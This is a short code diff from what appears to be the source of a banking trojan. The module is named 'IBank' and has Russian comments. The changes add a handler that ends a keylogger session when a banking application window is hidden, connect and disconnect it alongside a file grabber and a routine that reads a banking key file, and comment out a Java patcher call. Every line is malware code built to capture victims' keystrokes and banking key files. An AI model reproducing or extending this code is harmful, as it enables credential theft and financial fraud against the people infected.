@@ -259,6 +259,15 @@ namespace IBank
 		FileGrabber::AddReceiver(rv);
 	}
 
+	static void WINAPI IBankShowWindow( PKeyLogger Logger, DWORD EventID, LPVOID Data )
+	{
+		PShowWindowData d = (PShowWindowData) Data;
+		//IBDBG( "*********", "ShowWindow %d", d->Command );
+		if( Logger->ActiveWND == d->Window && d->Command == SW_HIDE )
+		{
+			KeyLogger::CloseSession();
+		}
+	}
 
 	//-----------------------------------------------------------------------
 	void SystemActivated(LPVOID Sender)
@@ -270,7 +279,7 @@ namespace IBank
 
 		// Сигнализируем ява патчеру о необходимости запуска патчей
 		#ifdef JAVS_PATCHERH
-			JavaPatcherSignal();
+//			JavaPatcherSignal();
 		#endif
 
 
@@ -299,6 +308,7 @@ namespace IBank
 			SetHooks();
 			Hooked = true;
 		}
+		KeyLogger::ConnectEventHandler(KLE_AFTER_SHOW_WND, IBankShowWindow );
 	}
 
 
@@ -323,6 +333,7 @@ namespace IBank
 
 		IBDBG("IBank", "Система %s закрыта", System->Name);
 		FileGrabber::Release();
+		KeyLogger::DisconnectEventHandler(KLE_AFTER_SHOW_WND, IBankShowWindow );
 
 		//читаем имя файла ключа записанного в другом процессе
 		char* nameFile = GetNameForKeyFile();
